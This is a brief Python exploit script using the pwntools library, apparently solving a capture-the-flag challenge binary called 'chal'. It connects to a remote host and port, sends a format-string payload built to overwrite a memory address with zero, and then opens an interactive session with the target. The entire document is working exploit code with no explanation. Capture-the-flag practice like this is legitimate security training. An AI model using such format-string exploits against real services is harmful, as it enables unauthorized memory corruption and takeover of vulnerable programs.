from pwn import *

context.binary = elf = ELF('chal')
#pr = process()
pr = remote('157.245.217.152',32663)
payload_1 = fmtstr_payload(10,{0x4040d0:0})
#gdb.attach(pr)
pr.sendline(payload_1)

pr.interactive()